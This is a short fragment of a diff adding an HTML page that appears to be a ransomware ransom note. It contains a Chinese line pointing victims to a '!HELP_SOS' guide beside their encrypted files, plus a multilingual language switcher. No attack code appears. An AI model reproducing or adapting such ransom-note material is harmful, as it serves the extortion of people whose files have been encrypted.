+				</div>
+				<div class='info'>
+					<p>您可以在加密文件旁边找到一份名称为"!HELP_SOS"的相同指南。</p>
+				</div>
+			</div>
+		</div>
+		<div class='lsb'>
+			<span class='ls ls-en' onclick="javascript:return setLang('en')">English</span>
+			<span class='ls ls-de' onclick="javascript:return setLang('de')">Deutsch</span>
+			<span class='ls ls-it' onclick="javascript:return setLang('it')">Italiano</span>
+			<span class='ls ls-pt' onclick="javascript:return setLang('pt')">Português</span>
+			<span class='ls ls-es' onclick="javascript:return setLang('es')">Español</span>
+			<span class='ls ls-fr' onclick="javascript:return setLang('fr')">Français</span>
+			<span class='ls ls-kr' onclick="javascript:return setLang('kr')">한국어</span>
+			<span class='ls ls-nl' onclick="javascript:return setLang('nl')">Nederlands</span>
+			<span class='ls ls-ar' onclick="javascript:return setLang('ar')">العربية</span>
+			<span class='ls ls-fa' onclick="javascript:return setLang('fa')">فارسی</span>
+			<span class='ls ls-zh' onclick="javascript:return setLang('zh')">中文</span>
+			
+		</div>
+	</body>
+</html>
